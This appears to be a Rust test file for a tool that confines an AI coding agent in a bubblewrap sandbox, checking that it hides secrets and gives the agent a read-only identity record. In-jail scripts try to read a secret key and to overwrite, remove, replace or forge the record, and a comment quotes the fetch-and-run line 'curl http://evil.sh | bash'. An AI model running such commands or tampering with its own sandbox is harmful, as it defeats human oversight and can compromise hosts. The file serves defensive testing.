use std::process::Command;

fn bin() -> &'static str {
    env!("CARGO_BIN_EXE_innerwarden")
}

/// A scratch record for the whole test binary.
///
/// Every CLI invocation here must write its narrative somewhere disposable.
/// Without this the suite recorded into the DEVELOPER'S OWN graph at
/// `~/.config/innerwarden/graph.json`: running `cargo test` injected fake attack
/// commands like `curl http://evil.sh | bash` into a real person's record and
/// pruned real history out of it. Found on 2026-08-05 while proving an unrelated
/// recording fix, when the graph under test changed size on its own.
fn scratch_graph() -> &'static std::path::Path {
    static DIR: std::sync::OnceLock<tempfile::TempDir> = std::sync::OnceLock::new();
    static PATH: std::sync::OnceLock<std::path::PathBuf> = std::sync::OnceLock::new();
    PATH.get_or_init(|| {
        DIR.get_or_init(|| tempfile::TempDir::new().expect("scratch dir"))
            .path()
            .join("graph.json")
    })
}

/// The CLI under test, pointed at a disposable record by default. A test that
/// asserts on the record sets `IW_GRAPH_FILE` again; the later value wins.
fn cli() -> Command {
    let mut command = Command::new(bin());
    command.env("IW_GRAPH_FILE", scratch_graph());
    command
}

#[cfg(any(target_os = "linux", target_os = "macos"))]
#[test]
fn unsafe_project_is_rejected_before_the_host_hook_is_mutated() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            home.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ])
        .env("HOME", home.path())
        .output()
        .expect("run contain with unsafe project");

    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("unsafe project path"));
    assert!(
        !home.path().join(".claude/settings.json").exists(),
        "validation must happen before hook installation mutates the host"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn linux_backend_masks_innerwarden_secrets_and_keeps_project_available() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".claude")).unwrap();
    std::fs::write(home.path().join(".claude/history.jsonl"), "{}\n").unwrap();
    let secret = home.path().join(".config/innerwarden/llm-key");
    std::fs::create_dir_all(secret.parent().unwrap()).unwrap();
    std::fs::write(&secret, "CJC-J007-SECRET").unwrap();
    let allowed = project.path().join("allowed.txt");
    std::fs::write(&allowed, "CJC-J007-PROJECT-OK").unwrap();

    let script = format!(
        "if cat '{}' 2>/dev/null; then exit 70; fi; cat '{}'",
        secret.display(),
        allowed.display()
    );
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            &script,
        ])
        .env("HOME", home.path())
        .output()
        .expect("run Linux AI Jail");

    assert!(
        output.status.success(),
        "AI Jail failed: {}",
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(String::from_utf8_lossy(&output.stdout).contains("CJC-J007-PROJECT-OK"));
    assert!(!String::from_utf8_lossy(&output.stdout).contains("CJC-J007-SECRET"));
}

#[cfg(target_os = "linux")]
fn require_bwrap() {
    let backend_available = ["/usr/bin/bwrap", "/bin/bwrap", "/usr/local/bin/bwrap"]
        .iter()
        .any(|path| std::path::Path::new(path).is_file());
    assert!(
        backend_available,
        "CJC-090-AT-007 requires a real trusted bubblewrap binary on Linux; install bwrap on the journey runner instead of silently skipping isolation"
    );
}

/// The in-jail script of the identity case: print the PID namespace the
/// jailed process is in, the record the launcher mounted, and whether the
/// agent can rewrite, remove or replace that record. The jail starts only
/// after the launcher handed the record in, so it is there from the first
/// line.
#[cfg(target_os = "linux")]
const READ_THE_RECORD: &str = "readlink /proc/self/ns/pid; \
    cat /run/innerwarden/instance.json; echo; \
    if ( : > /run/innerwarden/instance.json ) 2>/dev/null; then echo RECORD-WRITTEN; fi; \
    if rm -f /run/innerwarden/instance.json 2>/dev/null; then echo RECORD-REMOVED; fi; \
    if mv /run/innerwarden/instance.json /run/innerwarden/x 2>/dev/null; then echo RECORD-MOVED; fi; \
    if ( echo '{}' > /run/innerwarden/other.json ) 2>/dev/null \
        && mv -f /run/innerwarden/other.json /run/innerwarden/instance.json 2>/dev/null; \
        then echo RECORD-REPLACED; fi; \
    if [ -e /run/innerwarden/agent-tls.spki ]; then echo KEY-HANDED-IN; fi; \
    exit 0";

#[cfg(target_os = "linux")]
fn state_home() -> tempfile::TempDir {
    let home = tempfile::TempDir::new().unwrap();
    std::fs::create_dir_all(home.path().join(".local/state")).unwrap();
    home
}

/// No user service manager (the CI runner has none, and this removes the
/// variable that names one) and no Active Defence: the fallback path, which
/// is the one CI can prove. The scope itself is proven on a lab host by
/// `scripts/tests/contain-identity-escape.sh`.
#[cfg(target_os = "linux")]
fn identified_without_a_scope(command: &mut Command) -> &mut Command {
    command
        .env_remove("XDG_RUNTIME_DIR")
        .env_remove("XDG_STATE_HOME")
        .env("IW_AD_CLI_DIRS", "")
}

#[cfg(target_os = "linux")]
#[test]
fn identity_flag_mounts_the_record_read_only_inside_and_keeps_a_private_copy() {
    use std::os::unix::fs::PermissionsExt;
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            READ_THE_RECORD,
        ])
        .env("HOME", home.path());
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(output.status.success(), "AI Jail failed: {stderr}");
    assert!(stderr.contains("instance record:"), "{stderr}");

    // The launcher's copy: one private file, no temp left behind.
    let dir = home.path().join(".local/state/innerwarden/instances");
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    // The record, and the note naming the project beside it; no temp file.
    let records: Vec<_> = entries
        .iter()
        .filter(|p| p.extension().is_some_and(|e| e == "json"))
        .cloned()
        .collect();
    assert_eq!(
        entries.len(),
        2,
        "one record, one project note, no temp file: {entries:?}"
    );
    assert_eq!(records.len(), 1, "one record and no temp file: {entries:?}");
    let path = &records[0];
    assert_eq!(
        std::fs::metadata(path).unwrap().permissions().mode() & 0o777,
        0o600
    );
    assert_eq!(
        std::fs::metadata(&dir).unwrap().permissions().mode() & 0o777,
        0o700
    );
    let outside = std::fs::read(path).unwrap();

    // The jail's copy is the same bytes, and the agent can change none of it.
    let mut lines = stdout.lines();
    let ns_line = lines.next().unwrap_or_default().to_string();
    let inside_record = lines.next().unwrap_or_default().to_string();
    assert_eq!(
        inside_record.as_bytes(),
        outside.as_slice(),
        "the record inside the jail is the launcher's: {stdout}"
    );
    for tampered in [
        "RECORD-WRITTEN",
        "RECORD-REMOVED",
        "RECORD-MOVED",
        "RECORD-REPLACED",
    ] {
        assert!(!stdout.contains(tampered), "{tampered}: {stdout}");
    }
    // A host with no key file hands no key in.
    if !std::path::Path::new("/etc/innerwarden/agent-tls.spki").exists() {
        assert!(!stdout.contains("KEY-HANDED-IN"), "{stdout}");
    }

    let record: serde_json::Value = serde_json::from_slice(&outside).unwrap();
    // Schema 2 exactly when the jail was started with user namespaces closed
    // (a bwrap that takes the option, on a host that lets it): then, and only
    // then, the record says so. Any other jail writes the schema 1 it always
    // wrote, without the field.
    match record["schema"].as_u64() {
        Some(1) => assert!(record["jail"].get("userns_closed").is_none(), "{record}"),
        Some(2) => assert_eq!(record["jail"]["userns_closed"], true, "{record}"),
        other => panic!("schema {other:?}: {record}"),
    }
    assert_eq!(record["agent_type"], "claude-code");
    assert_eq!(record["mode"], "monitor");
    assert_eq!(
        record["project"].as_str().unwrap(),
        project.path().file_name().unwrap().to_str().unwrap(),
        "a folder name, not a path"
    );
    assert_eq!(
        path.file_stem().unwrap().to_str().unwrap(),
        record["instance_id"].as_str().unwrap()
    );
    // No manager, no scope, and the launcher says what that costs.
    assert!(record.get("scope").is_none(), "{record}");
    assert!(stderr.contains("identity is at most observed"), "{stderr}");
    assert!(
        !stderr.contains("system scope"),
        "no Active Defence, no request: {stderr}"
    );
    // The namespace the launcher recorded is the one the jailed process saw.
    let inside: u64 = ns_line
        .trim()
        .strip_prefix("pid:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("namespace link in stdout: {stdout:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["pid_ns"].as_u64().unwrap(), inside);
    let host = std::fs::read_link("/proc/self/ns/pid").unwrap();
    assert_ne!(
        format!("pid:[{inside}]"),
        host.to_string_lossy(),
        "the jail is not in the launcher's namespace"
    );
    assert!(record["jail"]["pid"].as_u64().unwrap() > 0);
    assert!(record["jail"]["start_ticks"].as_u64().unwrap() > 0);
}

#[cfg(target_os = "linux")]
#[test]
fn without_the_identity_flag_no_record_is_written_and_nothing_changes() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args([
            "contain",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            "readlink /proc/self/ns/pid",
        ])
        .env("HOME", home.path())
        .env_remove("XDG_STATE_HOME")
        .output()
        .expect("run Linux AI Jail");
    assert!(
        output.status.success(),
        "{}",
        String::from_utf8_lossy(&output.stderr)
    );
    let stderr = String::from_utf8_lossy(&output.stderr);
    assert!(!stderr.contains("instance record"), "{stderr}");
    assert!(
        !stderr.contains("scope"),
        "flag off: no scope, no word of one: {stderr}"
    );
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "flag off: no directory, no record"
    );
}

#[cfg(target_os = "linux")]
#[test]
fn dry_run_shows_the_record_and_info_descriptors_only_with_the_identity_flag() {
    let home = tempfile::TempDir::new().unwrap();
    let project = tempfile::TempDir::new().unwrap();
    let dry = |identity: bool| {
        let mut args = vec!["contain", "--dry-run"];
        if identity {
            args.push("--identity");
        }
        args.extend([
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/true",
        ]);
        let out = cli()
            .args(args)
            .env("HOME", home.path())
            .env_remove("XDG_RUNTIME_DIR")
            .output()
            .expect("dry run");
        assert!(out.status.success());
        String::from_utf8_lossy(&out.stdout).into_owned()
    };
    let plain = dry(false);
    let identified = dry(true);
    assert!(!plain.contains("--info-fd"), "{plain}");
    assert!(!plain.contains("--ro-bind-data"), "{plain}");
    assert!(!plain.contains("scope"), "{plain}");
    assert!(
        identified.contains(" --ro-bind-data 10 /run/innerwarden/instance.json --die-with-parent "),
        "the record is the last mount: {identified}"
    );
    assert!(
        identified.contains("--info-fd 9 -- /bin/true"),
        "{identified}"
    );
    // The key of Active Defence is handed in, just before the record, only
    // where the host has a key the launcher believes; with no key file there
    // is no mount, and the plain run never has one.
    let key = " --ro-bind-data 11 /run/innerwarden/agent-tls.spki";
    assert!(!plain.contains("agent-tls.spki"), "{plain}");
    if !std::path::Path::new("/etc/innerwarden/agent-tls.spki").exists() {
        assert!(!identified.contains("agent-tls.spki"), "{identified}");
    } else if identified.contains(key) {
        assert!(
            identified.contains(&format!(
                "{key} --ro-bind-data 10 /run/innerwarden/instance.json "
            )),
            "the key is just before the record: {identified}"
        );
    }
    // No manager named (or no systemd-run at all): the dry run says the real
    // run would have no scope, and what that costs.
    let scope_lines: Vec<&str> = identified
        .lines()
        .filter(|l| l.starts_with("# innerwarden contain: no scope ("))
        .collect();
    assert_eq!(scope_lines.len(), 1, "{identified}");
    assert!(
        scope_lines[0].ends_with("): identity is at most observed"),
        "{identified}"
    );
    // The command gets its own PATH and loader variables back through bwrap,
    // because the launcher's helpers run with a fixed PATH: those pairs, and
    // the agent name the hook is told, are the flag's other additions.
    let identified = {
        let mut tokens = identified.split(' ').peekable();
        let mut kept: Vec<&str> = Vec::new();
        while let Some(token) = tokens.next() {
            if token == "--setenv" {
                let name = tokens.next().unwrap_or("");
                let value = tokens.next().unwrap_or("");
                if name == "PATH" || name.starts_with("LD_") {
                    continue;
                }
                kept.extend(["--setenv", name, value]);
            } else {
                kept.push(token);
            }
        }
        kept.join(" ")
    };
    let identified: String = identified
        .lines()
        .filter(|l| !l.starts_with("#   IW_HOOK_AGENT="))
        .map(|l| format!("{l}\n"))
        .collect();
    // The two ways the dry run speaks of user namespaces: the option in the
    // argument list, or the line that says why it is not there. Never both,
    // and the plain run says neither.
    let option = " --unshare-user --disable-userns";
    let said = "# innerwarden contain: user namespaces stay open (";
    assert!(
        !plain.contains("--disable-userns") && !plain.contains(said),
        "{plain}"
    );
    assert!(
        !(identified.contains(option) && identified.contains(said)),
        "the option and its absence are not both said: {identified}"
    );
    if identified.contains(option) {
        assert_eq!(
            identified.matches("--disable-userns").count(),
            1,
            "{identified}"
        );
        assert!(
            identified.contains(&format!(" --unshare-ipc{option} --hostname ai-sandbox ")),
            "the option follows the namespaces: {identified}"
        );
    }
    let without: String = identified
        .replace(" --ro-bind-data 10 /run/innerwarden/instance.json", "")
        .replace(key, "")
        .replace(option, "")
        .replace(" --info-fd 9", "")
        .replace(
            &format!(
                " --tmpfs {}",
                home.path()
                    .join(".local/state/innerwarden/instances")
                    .display()
            ),
            "",
        )
        .lines()
        .filter(|l| !l.starts_with("# innerwarden contain: no scope") && !l.starts_with(said))
        .map(|l| format!("{l}\n"))
        .collect();
    assert_eq!(without, plain, "the flag adds these and nothing else");
    assert!(
        !home.path().join(".local/state/innerwarden").exists(),
        "a dry run writes no record"
    );
}

#[cfg(not(any(target_os = "linux", target_os = "macos")))]
#[test]
fn unsupported_platform_fails_without_claiming_a_jail() {
    let home = tempfile::TempDir::new().unwrap();
    let output = cli()
        .args(["contain", "--", "echo", "ok"])
        .env("HOME", home.path())
        .output()
        .expect("run contain");
    assert_eq!(output.status.code(), Some(2));
    assert!(String::from_utf8_lossy(&output.stderr).contains("not supported"));
}

/// Inside an identified jail: the mount namespace, the agent the launcher
/// named, `PATH`, and what is left of the launcher's records folder.
#[cfg(target_os = "linux")]
const LOOK_AT_THE_LAUNCHER: &str = "readlink /proc/self/ns/mnt; \
    echo \"agent=$IW_HOOK_AGENT\"; \
    echo \"path=$PATH\"; \
    d=\"$HOME/.local/state/innerwarden/instances\"; \
    echo \"seen=$(ls -A \"$d\" 2>/dev/null | wc -l | tr -d ' ')\"; \
    ( echo forged > \"$d/forged.json\" ) 2>/dev/null; \
    for f in \"$d\"/*.json; do [ -f \"$f\" ] && ( : > \"$f\" ) 2>/dev/null; done; \
    exit 0";

/// The launcher's records folder is under `~/.local`, which the jail binds
/// read-write. With `--identity` the jail sees it empty and nothing written
/// there reaches the host; the record names the mount namespace the jailed
/// process is in; the hook is told the agent; the command keeps its `PATH`.
#[cfg(target_os = "linux")]
#[test]
fn identity_hides_the_launchers_records_and_names_the_jails_mount_namespace() {
    require_bwrap();
    let home = state_home();
    let project = tempfile::TempDir::new().unwrap();
    let mut command = cli();
    command
        .args([
            "contain",
            "--identity",
            "--project",
            project.path().to_str().unwrap(),
            "--",
            "/bin/sh",
            "-c",
            LOOK_AT_THE_LAUNCHER,
        ])
        .env("HOME", home.path());
    let output = identified_without_a_scope(&mut command)
        .output()
        .expect("run Linux AI Jail with --identity");
    let stderr = String::from_utf8_lossy(&output.stderr);
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(output.status.success(), "AI Jail failed: {stderr}");

    let dir = home.path().join(".local/state/innerwarden/instances");
    let entries: Vec<_> = std::fs::read_dir(&dir)
        .expect("records dir")
        .map(|e| e.unwrap().path())
        .collect();
    let records: Vec<_> = entries
        .iter()
        .filter(|p| p.extension().is_some_and(|e| e == "json"))
        .cloned()
        .collect();
    assert_eq!(entries.len(), 2, "nothing written in the jail: {entries:?}");
    assert_eq!(records.len(), 1, "nothing written in the jail: {entries:?}");
    let outside = std::fs::read(&records[0]).unwrap();
    assert!(!outside.is_empty(), "the record was not truncated");
    let record: serde_json::Value = serde_json::from_slice(&outside).unwrap();

    let mut lines = stdout.lines();
    let mnt: u64 = lines
        .next()
        .unwrap_or_default()
        .trim()
        .strip_prefix("mnt:[")
        .and_then(|r| r.strip_suffix(']'))
        .unwrap_or_else(|| panic!("mount namespace link in stdout: {stdout:?}"))
        .parse()
        .unwrap();
    assert_eq!(record["jail"]["mnt_ns"].as_u64().unwrap(), mnt, "{stdout}");
    let host = std::fs::read_link("/proc/self/ns/mnt").unwrap();
    assert_ne!(format!("mnt:[{mnt}]"), host.to_string_lossy());
    assert_eq!(lines.next(), Some("agent=claude-code"), "{stdout}");
    let path = std::env::var("PATH").unwrap_or_default();
    assert_eq!(
        lines.next(),
        Some(format!("path={path}").as_str()),
        "{stdout}"
    );
    assert_eq!(lines.next(), Some("seen=0"), "{stdout}");
}
